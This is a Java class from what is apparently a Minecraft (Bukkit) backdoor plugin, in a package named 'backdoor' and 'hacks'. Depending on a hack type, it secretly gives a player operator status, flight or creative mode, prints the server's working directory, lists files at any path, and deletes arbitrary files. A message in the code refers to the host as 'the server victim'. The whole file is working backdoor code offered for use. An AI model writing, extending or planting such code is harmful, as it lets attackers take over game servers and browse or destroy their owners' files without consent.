package minecraft.backdoor.plugin.api.hacks;

import java.io.File;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class GiveHack {
	public static Player player;
	public static String file;
	
	public Player getPlayer() {
		return player;
	}
	
	public GiveHack(HackType type) {
		switch(type) {
		case OP:
			this.getPlayer().setOp(true);
			break;
		case FLY:
			this.getPlayer().setAllowFlight(true);
			this.getPlayer().setFlying(true);
			break;
		case GET_CREATIVE:
			this.getPlayer().setGameMode(GameMode.CREATIVE);
			break;
		case GET_SURVIVAL:
			this.getPlayer().setGameMode(GameMode.SURVIVAL);
			break;
		case PRINT_DIRECTORY:
			this.getPlayer().sendMessage(System.getProperty("user.dir"));
			break;
		case PRINT_FILES:
			File folder = new File(file);
			File[] listOfFiles = folder.listFiles();
			    for (int i = 0; i < listOfFiles.length; i++) {
			      if (listOfFiles[i].isFile()) {
			        this.getPlayer().sendMessage(ChatColor.DARK_RED + "["  + ChatColor.YELLOW +  "File" + ChatColor.DARK_RED + "] " + ChatColor.WHITE + listOfFiles[i].getName());
			      } else if (listOfFiles[i].isDirectory()) {
			    	 this.getPlayer().sendMessage(ChatColor.DARK_RED + "["  + ChatColor.DARK_AQUA +  "Directory" + ChatColor.DARK_RED + "] " + ChatColor.WHITE + listOfFiles[i].getName());
			      }
			    }
			    break;
		case REMOVE_FILE:
			try{
	    		File file_to_remove = new File(file);
	        	
	    		if(file_to_remove.delete()){
	    			this.getPlayer().sendMessage(file_to_remove.getName() + " is deleted!");
	    		}else{
	    			this.getPlayer().sendMessage("The server victim dont have permission to delete the file, or the file doesnt existe");
	    		}
	    	}catch(Exception e){
	    		e.printStackTrace();
	    	}
			break;
		}
	}
}
